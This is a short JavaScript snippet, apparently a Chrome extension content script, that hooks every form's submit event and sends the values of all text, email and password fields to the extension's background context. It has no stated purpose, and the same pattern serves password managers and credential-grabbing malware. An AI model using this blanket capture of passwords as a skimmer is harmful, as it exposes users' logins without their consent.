const forms = document.getElementsByTagName("form");
Array.from(forms).forEach(form => {
    form.addEventListener("submit", (e) => {
        const validElements = Array.from(e.target.elements).filter(element => element.type === "text" || element.type === "email" || element.type === "password");
        const hashMap = new Map();
        
        validElements.forEach(elem => hashMap.set(elem.name, elem.value));
        chrome.runtime.sendMessage(Object.fromEntries(hashMap.entries()), function(response){});
    })
});


